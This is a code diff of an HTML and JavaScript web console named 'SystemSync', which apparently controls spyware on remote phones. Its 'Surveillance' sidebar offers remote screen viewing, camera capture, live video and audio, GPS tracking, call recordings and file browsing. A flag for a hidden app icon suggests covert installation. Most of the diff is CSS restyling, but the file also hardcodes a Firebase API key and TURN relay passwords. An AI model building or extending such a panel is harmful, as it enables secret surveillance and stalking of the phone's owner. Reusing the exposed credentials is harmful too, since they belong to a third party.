@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>SystemSync Console · Remote Monitoring</title>
-    
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -12,129 +11,279 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
-    
     <style>
-        /* ========== All existing styles (unchanged) ========== */
-        :root {
-            --primary: #0f62fe;
-            --primary-hover: #0353e9;
-            --bg-body: #f4f7fb;
-            --bg-surface: #ffffff;
-            --text-main: #12161b;
-            --text-sec: #5c6a7a;
-            --border: #e2e8f0;
-            --danger: #e02424;
-            --danger-bg: #fdf2f2;
-            --success: #057a55;
-            --success-bg: #f3faf7;
-            --radius-sm: 8px;
-            --radius-md: 12px;
-            --radius-lg: 16px;
-            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
-            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.08);
-        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg-body); font-family: 'Inter', system-ui, sans-serif; display: flex; height: 100vh; overflow: hidden; color: var(--text-main); }
-        button, input, select, textarea { font-family: inherit; }
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+        body {
+            background: #f4f7fb;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+            color: #12161b;
+        }
+        /* Sidebar */
         #sidebar {
-            width: 280px; background: rgba(255, 255, 255, 0.6); backdrop-filter: blur(16px); border-right: 1px solid rgba(255, 255, 255, 0.4);
-            padding: 20px 16px; overflow-y: auto; flex-shrink: 0; box-shadow: 1px 0 10px rgba(0,0,0,0.02);
-            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); z-index: 200;
+            width: 280px;
+            background: rgba(255,255,255,0.6);
+            backdrop-filter: blur(16px);
+            border-right: 1px solid rgba(255,255,255,0.4);
+            padding: 20px 16px;
+            overflow-y: auto;
+            flex-shrink: 0;
+            transition: transform 0.3s;
+            z-index: 200;
+            display: none; /* hidden until device selected */
         }
-        .logo { font-size: 20px; font-weight: 700; color: var(--primary); margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
-        #sidebarCloseBtn { display: none; background: none; border: none; font-size: 20px; cursor: pointer; color: var(--text-sec); }
+        .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: #0f62fe;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e2e8f0;
+        }
         .section { margin-bottom: 24px; }
-        .section-title { font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 0.5px; padding-left: 8px; }
+        .section-title {
+            font-size: 11px;
+            font-weight: 700;
+            color: #94a3b8;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            padding-left: 8px;
+        }
         #sidebar button {
-            width: 100%; padding: 10px 14px; margin: 2px 0; background: transparent;
-            color: var(--text-main); border: none; border-radius: var(--radius-sm);
-            font-size: 14px; font-weight: 500; text-align: left; cursor: pointer; transition: all 0.2s ease;
-            display: flex; align-items: center; gap: 12px;
+            width: 100%;
+            padding: 10px 14px;
+            margin: 2px 0;
+            background: transparent;
+            color: #12161b;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: left;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: 0.2s;
         }
-        #sidebar button:hover { background: #f0f4f8; color: var(--primary); transform: translateX(2px); }
-        .camera-panel { background: #f8fafc; border-radius: var(--radius-sm); padding: 16px; margin: 8px 0 16px; border: 1px solid var(--border); display: none; }
-        .camera-panel.show { display: block; animation: slideDown 0.2s ease-out; }
-        @keyframes slideDown { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
-        .camera-option { margin: 8px 0; font-size: 13px; display: flex; gap: 12px; }
-        .camera-option label { color: var(--text-main); display: flex; align-items: center; gap: 4px; cursor: pointer; }
-        .capture-btn, .live-btn { background: var(--primary); color: white; border: none; padding: 10px; border-radius: var(--radius-sm); cursor: pointer; width: 100%; margin-top: 12px; font-weight: 600; transition: 0.2s; }
-        .capture-btn:hover, .live-btn:hover { background: var(--primary-hover); box-shadow: 0 4px 10px rgba(15,98,254,0.2); }
-        #main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: var(--bg-body); }
+        #sidebar button:hover {
+            background: #f0f4f8;
+            color: #0f62fe;
+        }
+        /* Camera panels */
+        .camera-panel {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #e2e8f0;
+            display: none;
+        }
+        .camera-panel.show { display: block; }
+        .camera-option { margin: 8px 0; display: flex; gap: 12px; }
+        .capture-btn, .live-btn {
+            background: #0f62fe;
+            color: white;
+            border: none;
+            padding: 8px;
+            border-radius: 8px;
+            width: 100%;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+        /* Main content */
+        #main {
+            flex: 1;
+            display: none;
+            flex-direction: column;
+            background: #f4f7fb;
+        }
         #header {
-            height: 64px; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255,255,255,0.4);
-            display: flex; align-items: center; justify-content: space-between;
-            padding: 0 24px; flex-shrink: 0; box-shadow: var(--shadow-sm); z-index: 10;
+            height: 64px;
+            background: rgba(255,255,255,0.7);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
         }
-        #menuBtn { display: none; background: #f1f5f9; border: none; border-radius: var(--radius-sm); padding: 8px; font-size: 18px; cursor: pointer; }
-        #headerTitle { font-size: 16px; font-weight: 600; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        #serverInfo { font-weight: 400; color: var(--text-sec); font-size: 14px; margin-left: 8px; }
-        #status { padding: 6px 16px; border-radius: 20px; background: #eff6ff; color: var(--primary); font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 6px; }
-        #status::before { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--primary); box-shadow: 0 0 6px var(--primary); }
-        #status.offline { background: var(--danger-bg); color: var(--danger); }
-        #status.offline::before { background: var(--danger); box-shadow: 0 0 6px var(--danger); }
-        #reconnectBtn { background: var(--bg-surface); color: var(--text-sec); border: 1px solid var(--border); border-radius: 50%; width: 32px; height: 32px; cursor: pointer; margin-left: 10px; }
-        #content { flex: 1; padding: 24px; overflow: auto; }
-        #main-panel { background: var(--bg-surface); border-radius: var(--radius-md); padding: 32px; min-height: 100%; box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
-        table { width: 100%; border-collapse: separate; border-spacing: 0; font-size: 14px; border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; }
-        th { background: #f8fafc; padding: 12px 16px; text-align: left; font-weight: 600; border-bottom: 1px solid var(--border); }
-        td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; }
-        tbody tr:hover { background: #f8fafc; }
-        .pagination { margin-top: 20px; display: flex; gap: 8px; justify-content: center; }
-        .page-btn { padding: 6px 14px; border: 1px solid #cbd5e1; background: white; border-radius: var(--radius-sm); cursor: pointer; }
+        #status {
+            padding: 6px 16px;
+            border-radius: 20px;
+            background: #eff6ff;
+            color: #0f62fe;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        #status.offline {
+            background: #fee2e2;
+            color: #d32f2f;
+        }
+        #reconnectBtn {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        #content {
+            flex: 1;
+            padding: 24px;
+            overflow: auto;
+        }
+        #main-panel {
+            background: white;
+            border-radius: 16px;
+            padding: 32px;
+            min-height: 100%;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            border: 1px solid #e2e8f0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        th {
+            background: #f8fafc;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+        }
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #f1f5f9;
+        }
+        .btn-ui {
+            padding: 8px 16px;
+            border-radius: 8px;
+            border: none;
+            font-weight: 500;
+            cursor: pointer;
+            background: #f1f5f9;
+        }
+        .btn-ui.primary {
+            background: #0f62fe;
+            color: white;
+        }
+        /* Auth overlays */
         #authContainer, #deviceListContainer {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px);
-            display: flex; justify-content: center; align-items: center; z-index: 20000;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
         }
         #authBox, #deviceListBox {
-            background: white; padding: 40px; border-radius: var(--radius-lg);
-            width: 400px; max-width: 90%; box-shadow: var(--shadow-lg);
-            animation: fadeInScale 0.4s;
+            background: white;
+            padding: 40px;
+            border-radius: 24px;
+            width: 400px;
+            max-width: 90%;
+            text-align: center;
         }
-        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
-        #authBox h2, #deviceListBox h2 { font-size: 24px; font-weight: 700; margin-bottom: 24px; text-align: center; color: var(--text-main); }
-        #authBox input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: var(--radius-sm); }
-        #authBox button, #logoutBtn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: var(--radius-sm); cursor: pointer; margin-top: 12px; }
-        .toggle-link { text-align: center; margin-top: 15px; color: var(--primary); cursor: pointer; }
-        .device-item { display: flex; align-items: center; padding: 16px; border: 1px solid var(--border); border-radius: var(--radius-md); margin-bottom: 12px; cursor: pointer; background: var(--bg-surface); }
-        .device-item:hover { border-color: var(--primary); transform: translateY(-2px); }
-        .device-info { flex: 1; margin-left: 16px; }
-        .device-name { font-size: 16px; font-weight: 600; }
-        .device-id { font-size: 12px; color: var(--text-sec); font-family: monospace; }
-        /* File Manager Tree View (unchanged) */
-        .file-toolbar-sticky { position: sticky; top: 0; background: white; z-index: 10; padding: 12px 0; border-bottom: 1px solid var(--border); display: flex; gap: 12px; margin-bottom: 16px; }
+        #authBox input, #deviceListBox input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+        }
+        #authBox button, #logoutBtn {
+            width: 100%;
+            padding: 12px;
+            background: #0f62fe;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+        .toggle-link {
+            margin-top: 16px;
+            color: #0f62fe;
+            cursor: pointer;
+        }
+        .device-item {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            background: white;
+        }
+        .device-item:hover {
+            border-color: #0f62fe;
+        }
+        /* File manager */
+        .file-toolbar-sticky {
+            position: sticky;
+            top: 0;
+            background: white;
+            padding: 12px 0;
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
         .tree-root { list-style: none; padding-left: 0; }
-        .tree-children { display: grid; grid-template-rows: 0fr; transition: grid-template-rows 0.3s ease-out; }
+        .tree-children {
+            display: grid;
+            grid-template-rows: 0fr;
+            transition: grid-template-rows 0.3s;
+        }
         .tree-children.expanded { grid-template-rows: 1fr; }
-        .tree-children-inner { overflow: hidden; padding-left: 20px; border-left: 1px dashed var(--border); margin-left: 10px; }
-        .folder-header, .file-row { display: flex; align-items: center; padding: 8px 12px; border-radius: var(--radius-sm); cursor: pointer; }
+        .tree-children-inner {
+            overflow: hidden;
+            padding-left: 20px;
+            border-left: 1px dashed #e2e8f0;
+            margin-left: 10px;
+        }
+        .folder-header, .file-row {
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
         .folder-header:hover, .file-row:hover { background: #f8fafc; }
-        .folder-icon, .file-icon { width: 24px; text-align: center; margin-right: 12px; }
-        .chevron { font-size: 12px; margin-right: 8px; transition: transform 0.3s; display: inline-block; width: 12px; }
+        .folder-icon, .file-icon { width: 24px; margin-right: 12px; }
+        .chevron {
+            font-size: 12px;
+            margin-right: 8px;
+            transition: transform 0.3s;
+            display: inline-block;
+            width: 12px;
+        }
         .chevron.down { transform: rotate(90deg); }
         .item-name { flex: 1; font-size: 14px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .file-size { font-size: 12px; color: var(--text-sec); margin-left: 10px; }
-        .file-actions { opacity: 0; transition: opacity 0.2s; margin-left: 16px; display: inline-flex; gap: 6px; }
+        .file-size { font-size: 12px; color: #5c6a7a; margin-left: 10px; }
+        .file-actions { opacity: 0; transition: 0.2s; margin-left: 16px; display: inline-flex; gap: 6px; }
         .file-row:hover .file-actions { opacity: 1; }
-        .file-action-btn { background: #fff; border: 1px solid var(--border); border-radius: 4px; padding: 4px 8px; font-size: 12px; cursor: pointer; }
-        .btn-ui { padding: 8px 16px; font-size: 14px; font-weight: 500; border-radius: var(--radius-sm); cursor: pointer; border: none; display: inline-flex; align-items: center; gap: 6px; }
-        .btn-ui.primary { background: var(--primary); color: white; }
-        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 10000; }
-        .modal-overlay.show { display: flex; }
-        .mobile-popup { width: min(92vw, calc(92vh * 9 / 16)); height: min(92vh, calc(92vw * 16 / 9)); background: #000; border-radius: var(--radius-lg); overflow: hidden; position: relative; }
-        .phone-frame { display: flex; align-items: center; justify-content: center; background: black; height: 100%; }
-        .phone-frame video { width: 100%; height: 100%; object-fit: contain; }
-        .popup-controls { position: absolute; bottom: 0; left: 0; right: 0; background: #111; padding: 12px; display: flex; gap: 12px; justify-content: center; }
-        .popup-controls button { width: 48px; height: 48px; background: #222; color: white; border: none; border-radius: 50%; cursor: pointer; font-size: 20px; }
-        #downloadProgress { background: white; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 16px; margin: 0 24px 16px; display: none; }
-        #progressBar { width: 0%; height: 8px; background: var(--primary); border-radius: 4px; }
+        .file-action-btn {
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        /* Call recording card */
         .call-recording-card {
             background: white;
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
             padding: 16px;
             margin-bottom: 12px;
             display: flex;
@@ -143,32 +292,112 @@
             flex-wrap: wrap;
             gap: 12px;
         }
-        .download-recording-btn { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: var(--radius-sm); cursor: pointer; }
+        .download-recording-btn {
+            background: #0f62fe;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        /* Map */
+        #map { height: 380px; border-radius: 12px; }
+        .map-info {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: rgba(255,255,255,0.95);
+            padding: 8px 12px;
+            border-radius: 8px;
+            border-left: 4px solid #0f62fe;
+        }
+        /* Modal for camera */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        .modal-overlay.show { display: flex; }
+        .mobile-popup {
+            width: min(92vw, calc(92vh * 9 / 16));
+            height: min(92vh, calc(92vw * 16 / 9));
+            background: black;
+            border-radius: 24px;
+            overflow: hidden;
+            position: relative;
+        }
+        .phone-frame {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: black;
+            height: 100%;
+        }
+        .phone-frame video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .popup-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #111;
+            padding: 12px;
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+        .popup-controls button {
+            width: 48px;
+            height: 48px;
+            background: #222;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+        }
         @media (max-width: 768px) {
-            #sidebar { position: fixed; transform: translateX(-100%); z-index: 1000; }
+            #sidebar {
+                position: fixed;
+                transform: translateX(-100%);
+                z-index: 1000;
+            }
             #sidebar.open { transform: translateX(0); }
             #menuBtn { display: block; }
-            #sidebarOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 99; }
+            #sidebarOverlay {
+                display: none;
+                position: fixed;
+                inset: 0;
+                background: rgba(0,0,0,0.5);
+                z-index: 99;
+            }
             #sidebarOverlay.show { display: block; }
         }
     </style>
 </head>
 <body>
 <div id="sidebarOverlay" onclick="closeSidebar()"></div>
-<div id="authContainer"><div id="authBox"><h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div></div></div>
+<div id="authContainer"><div id="authBox"><h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email"><input type="password" id="authPassword" placeholder="Password"><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;"><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div></div></div>
 <div id="deviceListContainer" style="display:none;"><div id="deviceListBox"><h2>📱 Your Devices</h2><div id="deviceList"></div><button id="logoutBtn">Logout</button></div></div>
 
 <div id="screenModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="modalSnapBtn">📸</button><button id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn">✕</button></div></div></div>
 <div id="cameraModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalCameraVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="cameraSnapBtn">📸</button><button id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button id="cameraCloseBtn">✕</button></div></div></div>
 <div id="audioModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><audio id="modalAudioPlayer" controls></audio></div><div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn">✕</button></div></div></div>
 
-<div id="sidebar"><div class="logo">SystemSync 🔗</div>
+<div id="sidebar">
+    <div class="logo">SystemSync 🔗</div>
     <div class="section"><div class="section-title">Surveillance</div>
         <button id="screenShareBtn"><span>🖥</span> Start Screen</button>
         <button id="clickPictureBtn"><span>📷</span> Click Picture</button>
-        <div id="clickCameraPanel" class="camera-panel"><div><label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label><label><input type="radio" name="clickCameraSelect" value="back"> Rear</label></div><div id="clickFlashContainer"><label><input type="checkbox" id="clickFlashCheckbox"> Flash</label></div><button class="capture-btn" id="capturePictureBtn">TAKE PICTURE</button></div>
+        <div id="clickCameraPanel" class="camera-panel"><div class="camera-option"><label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label><label><input type="radio" name="clickCameraSelect" value="back"> Rear</label></div><div class="camera-option"><label><input type="checkbox" id="clickFlashCheckbox"> Flash</label></div><button class="capture-btn" id="capturePictureBtn">TAKE PICTURE</button></div>
         <button id="liveCameraBtn"><span>📹</span> See Live</button>
-        <div id="liveCameraPanel" class="camera-panel"><div><label><input type="radio" name="liveCameraSelect" value="front" checked> Front</label><label><input type="radio" name="liveCameraSelect" value="back"> Rear</label></div><div><label><input type="checkbox" id="liveFlashCheckbox"> Flash</label><label><input type="checkbox" id="liveMicCheckbox" checked> Mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start Live</button></div>
+        <div id="liveCameraPanel" class="camera-panel"><div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked> Front</label><label><input type="radio" name="liveCameraSelect" value="back"> Rear</label></div><div class="camera-option"><label><input type="checkbox" id="liveFlashCheckbox"> Flash</label><label><input type="checkbox" id="liveMicCheckbox" checked> Mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start Live</button></div>
         <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>
         <button id="stopLiveAudioBtn" style="display:none;">Stop</button>
         <button id="getLocationBtn"><span>📍</span> GPS Location</button>
@@ -207,41 +436,42 @@
     <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
 </div>
 
-<div id="main"><div id="header"><div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span> <button id="headerLeaveBtn" style="display:none;" onclick="leaveDevice()">Leave Device</button></span></div><div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div></div>
-<div id="downloadProgress"><div><span id="progressFileName">Downloading...</span><span id="progressPercent">0%</span></div><div><div id="progressBar"></div></div></div>
-<div id="content"><div id="main-panel">🔌 Initializing connection...</div></div></div>
+<div id="main">
+    <div id="header">
+        <div><button id="menuBtn" style="display:none;" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo"></span> <button id="headerLeaveBtn" style="display:none;" onclick="leaveDevice()">Leave Device</button></span></div>
+        <div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div>
+    </div>
+    <div id="downloadProgress" style="display:none; background:#fff; padding:12px; margin:0 24px 12px; border-radius:8px;"><div><span id="progressFileName"></span> <span id="progressPercent"></span></div><div><div id="progressBar" style="height:6px; background:#0f62fe; width:0%;"></div></div></div>
+    <div id="content"><div id="main-panel">🔌 Select a device to start...</div></div>
+</div>
 
 <script>
-// ==================== FIREBASE & CONFIG ====================
-const CONFIG = {
-    WS_URL: "wss://mirror-view.onrender.com",
-    MAX_RECONNECT_DELAY: 30000,
-    FIREBASE_CONFIG: { apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc", authDomain: "webviewiot.firebaseapp.com", projectId: "webviewiot", storageBucket: "webviewiot.firebasestorage.app", messagingSenderId: "634777347775", appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a" }
+// ==================== FIREBASE CONFIG ====================
+const firebaseConfig = {
+    apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
+    authDomain: "webviewiot.firebaseapp.com",
+    projectId: "webviewiot",
+    storageBucket: "webviewiot.firebasestorage.app",
+    messagingSenderId: "634777347775",
+    appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a"
 };
-
-firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
+firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const db = firebase.firestore();
 const storage = firebase.storage();
 
-// ========== ENHANCED ICE SERVERS FOR RELIABLE CONNECTION ON ANY NETWORK ==========
+// ==================== ENHANCED ICE SERVERS ====================
 const ICE_SERVERS = [
-    // STUN servers (for discovering public IP)
     { urls: "stun:stun.l.google.com:19302" },
     { urls: "stun:stun1.l.google.com:19302" },
-    { urls: "stun:stun2.l.google.com:19302" },
     { urls: "stun:stun.relay.metered.ca:80" },
-    // TURN servers (UDP, TCP, TLS) – fallback when direct connection fails
     { urls: "turn:global.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
     { urls: "turn:global.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
     { urls: "turn:global.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
-    { urls: "turns:global.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
-    // Additional public TURN servers (free, limited)
-    { urls: "turn:openrelay.metered.ca:80", username: "openrelayproject", credential: "openrelayproject" },
-    { urls: "turn:openrelay.metered.ca:443", username: "openrelayproject", credential: "openrelayproject" },
-    { urls: "turn:openrelay.metered.ca:443?transport=tcp", username: "openrelayproject", credential: "openrelayproject" }
+    { urls: "turns:global.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
 ];
 
+// ==================== GLOBALS ====================
 let currentUser = null, selectedDeviceId = null, ws = null, reconnectTimer = null, reconnectAttempts = 0;
 let screenPC = null, cameraPC = null, audioPC = null, fileTransfers = {}, mapInstance = null;
 let currentData = [], currentPage = 0, dataType = null, currentPath = "root", selectedFiles = [];
@@ -249,7 +479,7 @@ let screenActive = false, iconHidden = false, flashOn = false, isLoginMode = tru
 let mediaRecorder = null, recordedChunks = [], pendingCommand = null, newAlerts = [];
 let screenMediaRecorder = null, screenRecordedChunks = [];
 let currentCameraStream = null, currentAudioStream = null;
-let socialMsgsData = [], currentLocation = null;
+let currentLocation = null;
 
 const panel = document.getElementById('main-panel');
 const statusEl = document.getElementById('status');
@@ -257,9 +487,8 @@ const wsDebug = document.getElementById('wsDebug');
 
 function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
 function formatBytes(b) { if(b===0) return '0 B'; const i=Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,i)).toFixed(1)+' '+['B','KB','MB','GB'][i]; }
-function formatDuration(ms) { const h=Math.floor(ms/3600000); const m=Math.floor((ms%3600000)/60000); const s=Math.floor((ms%60000)/1000); return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`; }
-function setStatus(s) { statusEl.innerText=s; if(s==='ONLINE'){statusEl.classList.remove('offline');}else{statusEl.classList.add('offline');} }
 function showNotification(t) { const o=statusEl.innerText; statusEl.innerText=t; setTimeout(()=>statusEl.innerText=o,2000); }
+function setStatus(s) { statusEl.innerText=s; if(s==='ONLINE') statusEl.classList.remove('offline'); else statusEl.classList.add('offline'); }
 function pushAlert(t,b) { newAlerts.unshift({title:t,body:b,time:new Date().toLocaleTimeString()}); if(newAlerts.length>50)newAlerts.pop(); const badge=document.getElementById('alertsBadge'),list=document.getElementById('alertsList'); if(badge){badge.style.display='block';list.innerHTML='';newAlerts.forEach(a=>{const d=document.createElement('div');d.style.cssText='margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';d.textContent=a.time+' '+a.title+': '+a.body;list.appendChild(d);});} }
 function clearAlerts() { newAlerts=[]; document.getElementById('alertsBadge').style.display='none'; }
 function downloadBase64(b64,fn){ const a=document.createElement('a'); a.href='data:application/octet-stream;base64,'+b64; a.download=fn; a.click(); }
@@ -269,9 +498,9 @@ function closeSidebar() { const sb=document.getElementById('sidebar'), ov=docume
 // ==================== AUTH ====================
 function renderAuthForm() {
     const c=document.getElementById('authBox');
-    if(isLoginMode) c.innerHTML=`<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div>`;
-    else c.innerHTML=`<h2>✨ Create Account</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" /><button id="authBtn">Sign Up</button><div class="toggle-link" id="toggleAuthMode">Already have an account? Sign in</div><div id="authError"></div>`;
-    document.getElementById('authBtn').onclick=handleAuth; 
+    if(isLoginMode) c.innerHTML=`<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email"><input type="password" id="authPassword" placeholder="Password"><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;"><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div>`;
+    else c.innerHTML=`<h2>✨ Create Account</h2><input type="email" id="authEmail" placeholder="Email"><input type="password" id="authPassword" placeholder="Password"><input type="password" id="authConfirmPassword" placeholder="Confirm Password"><button id="authBtn">Sign Up</button><div class="toggle-link" id="toggleAuthMode">Already have an account? Sign in</div><div id="authError"></div>`;
+    document.getElementById('authBtn').onclick=handleAuth;
     document.getElementById('toggleAuthMode').onclick=(e)=>{e.preventDefault();isLoginMode=!isLoginMode;renderAuthForm();};
 }
 async function handleAuth(){
@@ -298,8 +527,8 @@ async function loadDevices(){
     const snap=await db.collection('devices').where('userId','==',currentUser.uid).get();
     const list=document.getElementById('deviceList');
